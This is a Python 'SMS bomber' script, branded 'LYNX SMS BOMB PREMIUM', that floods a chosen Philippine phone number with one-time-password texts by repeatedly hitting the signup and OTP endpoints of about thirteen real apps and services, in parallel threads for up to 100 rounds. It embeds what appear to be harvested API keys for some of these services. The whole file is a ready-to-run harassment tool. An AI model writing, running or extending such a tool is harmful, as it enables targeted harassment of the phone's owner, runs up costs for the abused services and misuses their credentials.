import random
import string
import json
import sys
import os
import time
import requests
import hashlib
import threading
import uuid
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue

def install_packages():
    required = ['requests', 'colorama']
    for package in required:
        try:
            __import__(package)
        except:
            os.system(f"{sys.executable} -m pip install {package}")

install_packages()

from colorama import Fore, Style, init
init(autoreset=True)

RED = Fore.RED
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

def get_rainbow_text(text):
    """Generates a smooth mixed rainbow effect per character"""
    output = ""
    for i, char in enumerate(text):
        # RGB smooth transition formula
        r = int(127 * (1 + (0.3 * i))) % 255
        g = int(127 * (1 + (0.5 * i))) % 255
        b = int(127 * (1 + (0.7 * i))) % 255
        output += f"\033[38;2;{r};{g};{b}m{char}"
    return output + RESET

class MWELLWorker:
    def __init__(self, parent):
        self.parent = parent
        self.queue = Queue()
        self.running = False
        self.current_cooldown = 0
        self.worker_thread = None
        self.batch_results = {}
        
    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker_thread.start()
    
    def stop(self):
        self.running = False
        if self.worker_thread:
            self.worker_thread.join(timeout=2)
    
    def add_task(self, phone_number, batch_num):
        self.queue.put((phone_number, batch_num))
    
    def _worker_loop(self):
        while self.running:
            try:
                if not self.queue.empty():
                    phone_number, batch_num = self.queue.get()
                    if self.current_cooldown > 0:
                        time.sleep(1)
                        self.current_cooldown -= 1
                        self.queue.put((phone_number, batch_num))
                        self.queue.task_done()
                        continue
                    
                    success, message, new_cooldown = self._send_mwell_request(phone_number)
                    if success:
                        self.parent.log_success(phone_number)
                        
                    self.batch_results[batch_num] = {
                        'success': success,
                        'message': message,
                        'timestamp': datetime.now().strftime("%H:%M:%S")
                    }
                    self.current_cooldown = new_cooldown if new_cooldown > 0 else 60
                    self.queue.task_done()
                else:
                    time.sleep(0.5)
            except:
                time.sleep(2)
    
    def _send_mwell_request(self, phone_number):
        try:
            formatted_phone = self.parent.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-app-version': '03.942.038',
                'x-device-type': 'android',
                'x-timestamp': str(int(time.time() * 1000)),
                'x-request-id': self.parent.random_string(16),
                'Content-Type': 'application/json'
            }
            data = {"country": "PH", "phoneNumber": formatted_phone, "phoneNumberPrefix": "+63"}
            response = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number', 
                                   headers=headers, json=data, timeout=15)
            return response.status_code == 200, "Success", 60
        except:
            return False, "Conn Error", 30

class PEXXWorker:
    def __init__(self, parent):
        self.parent = parent
        self.queue = Queue()
        self.running = False
        self.worker_thread = None
        self.batch_results = {}
        
    def start(self):
        self.running = True
        self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker_thread.start()
    
    def stop(self):
        self.running = False

    def add_task(self, phone_number, batch_num):
        self.queue.put((phone_number, batch_num))
    
    def _worker_loop(self):
        while self.running:
            if not self.queue.empty():
                phone, batch = self.queue.get()
                success, msg = self._send_pexx(phone)
                if success:
                    self.parent.log_success(phone)
                self.batch_results[batch] = {'success': success, 'message': msg, 'timestamp': datetime.now().strftime("%H:%M:%S")}
                self.queue.task_done()
                time.sleep(5)
            time.sleep(0.5)

    def _send_pexx(self, phone):
        try:
            p = self.parent.format_phone(phone)
            h = {'User-Agent': 'okhttp/4.12.0', 'tid': self.parent.random_string(11), 'appversion': '3.0.14'}
            d = {"0": {"json": {"areaCode": "+63", "phone": f"+63{p}", "otpUsage": "REGISTRATION"}}}
            r = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1', headers=h, json=d, timeout=15)
            return r.status_code == 200, "Sent"
        except: return False, "Error"

class cozybombtools:
    def __init__(self):
        self.osim_url = "https://prod.services.osim-cloud.com/identity/api/v1.0/account"
        self.success_count = 0
        self.fail_count = 0
        self.mwell_worker = MWELLWorker(self)
        self.pexx_worker = PEXXWorker(self)
        
        self.all_services = [
            ("BOMB OTP", self.send_bomb_otp), ("EZLOAN", self.send_ezloan),
            ("XPRESS PH", self.send_xpress), ("BISTRO", self.send_bistro),
            ("BAYAD CENTER", self.send_bayad), ("LBC CONNECT", self.send_lbc),
            ("PICKUP COFFEE", self.send_pickup_coffee), ("HONEY LOAN", self.send_honey_loan),
            ("KUMU PH", self.send_kumu_ph), ("S5.COM", self.send_s5_otp),
            ("CASHALO", self.send_cashalo)
        ]

    def log_success(self, phone):
        t = datetime.now().strftime("%H:%M:%S")
        log_text = f"[{t}] successfully sent to {phone}"
        print(get_rainbow_text(log_text))

    def format_phone(self, phone):
        phone = "".join(filter(str.isdigit, str(phone)))
        if phone.startswith('0'): phone = phone[1:]
        if phone.startswith('63'): phone = phone[2:]
        return phone

    def random_string(self, length):
        return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

    def random_gmail(self):
        return self.random_string(10) + "@gmail.com"

    def send_bomb_otp(self, p):
        try:
            d = {"userName": self.format_phone(p), "phoneCode": "63", "password": "Password123!"}
            r = requests.post(f"{self.osim_url}/register", json=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_ezloan(self, p):
        try:
            h = {'User-Agent': 'okhttp/4.9.2', 'source': 'EZLOAN'}
            d = {"businessId": "EZLOAN", "contactNumber": f"+63{self.format_phone(p)}", "appsflyerIdentifier": str(uuid.uuid4())}
            r = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request', headers=h, json=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_xpress(self, p, idx=1):
        try:
            d = {"FirstName": "User", "LastName": "Rush", "Email": self.random_gmail(), "Phone": f"+63{self.format_phone(p)}", "Password": "Password123!"}
            r = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", json=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_bistro(self, p):
        try:
            u = f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{self.format_phone(p)}'
            r = requests.get(u, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_bayad(self, p):
        try:
            d = {"mobileNumber": f"+63{self.format_phone(p)}", "emailAddress": self.random_gmail()}
            r = requests.post("https://api.online.bayad.com/api/sign-up/otp", json=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_lbc(self, p):
        try:
            d = {'verification_type': 'mobile', 'client_contact_no': self.format_phone(p)}
            r = requests.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', data=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_pickup_coffee(self, p):
        try:
            d = {"mobile_number": f"+63{self.format_phone(p)}", "login_method": "mobile_number"}
            r = requests.post('https://production.api.pickup-coffee.net/v2/customers/login', json=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_honey_loan(self, p):
        try:
            d = {"phone": p, "is_rights_block_accepted": 1}
            r = requests.post('https://api.honeyloan.ph/api/client/registration/step-one', json=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_kumu_ph(self, p):
        try:
            d = {"country_code": "+63", "cellphone": self.format_phone(p), "encrypt_timestamp": int(time.time())}
            r = requests.post('https://api.kumuapi.com/v2/user/sendverifysms', json=d, timeout=10)
            return r.status_code in [200, 403], "Sent"
        except: return False, "Err"

    def send_s5_otp(self, p):
        try:
            r = requests.post('https://api.s5.com/player/api/v1/otp/request', data={'phone_number': f'+63{self.format_phone(p)}'}, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def send_cashalo(self, p):
        try:
            dev = str(uuid.uuid4())[:16]
            h = {'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==', 'x-device-identifier': dev}
            d = {"phone_number": self.format_phone(p), "device_identifier": dev, "device_type": 1}
            r = requests.post('https://api.cashaloapp.com/access/register', headers=h, json=d, timeout=10)
            return r.status_code == 200, "Sent"
        except: return False, "Err"

    def print_menu(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = f"""{RED}
LYNX SMS BOMB PREMIUM
"""
        print(banner)
        print(f"{RED}{' [1] start sms bomb     [2] exit       ':^50}")
        print(f"{RED}{'╚══════════════════════════════════════════════╝':^50}")
        print(f"\n{BLUE}╭─╼ {RED}[note]")
        print(f"{BLUE}╰╼  {RED}ph number only example 09********* | coded by Lynx")

    def execute_parallel_attack(self, phone, amount):
        self.mwell_worker.start()
        self.pexx_worker.start()
        for i in range(1, amount + 1):
            self.mwell_worker.add_task(phone, i)
            self.pexx_worker.add_task(phone, i)

        print(f"\n{BLUE}╭─╼ {RED}[Status]")
        print(f"{BLUE}╰╼  {RED}starting sending sms to +63{self.format_phone(phone)}...")

        for b in range(1, amount + 1):
            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = {executor.submit(func, phone): name for name, func in self.all_services}
                for f in as_completed(futures):
                    res, _ = f.result()
                    if res:
                        self.success_count += 1
                        self.log_success(phone)
                    else:
                        self.fail_count += 1
            time.sleep(1)

        while not self.mwell_worker.queue.empty() or not self.pexx_worker.queue.empty():
            time.sleep(1)
        
        self.mwell_worker.stop()
        self.pexx_worker.stop()
        
        print(f"\n{BLUE}╭─╼ {RED}[Finish]")
        print(f"{BLUE}╰╼  {RED}Success: {self.success_count} | Failed: {self.fail_count}")

    def run(self):
        while True:
            self.print_menu()
            print(f"\n{BLUE}╭─╼ {RED}[option]")
            opt = input(f"{BLUE}╰╼  {RED}")
            
            if opt == '1':
                print(f"\n{BLUE}╭─╼ {RED}[number]")
                p = input(f"{BLUE}╰╼  {RED}")
                print(f"\n{BLUE}╭─╼ {RED}[amount 0-100]")
                try:
                    a = int(input(f"{BLUE}╰╼  {RED}"))
                    if 0 <= a <= 100:
                        self.execute_parallel_attack(p, a)
                    else:
                        print(f"{RED}Invalid amount!")
                except:
                    print(f"{RED}Error in input!")
                input(f"\n{RED}Press Enter to continue...")
            elif opt == '2':
                break

if __name__ == "__main__":
    cozybombtools().run()
